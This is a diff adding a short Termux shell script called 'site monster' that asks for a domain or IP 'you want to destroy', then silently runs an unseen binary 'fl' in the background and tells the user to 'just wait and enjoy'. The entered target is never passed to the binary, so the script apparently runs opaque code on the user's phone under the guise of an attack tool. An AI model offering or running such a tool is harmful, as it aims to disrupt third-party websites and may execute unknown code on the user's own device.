@@ -1,0 +1,8 @@
+clear
+termux-setup-storage
+echo -e "Hi! Wellcome to site monster!\n\tEnter Domain/IP, you eant to destroy:\n"
+read
+chmod +x fl
+alias s="pkill ./fl"
+./fl >> /sdcard/PAYLOAD.PY &
+echo -e "just wait and enjoy :3\n"
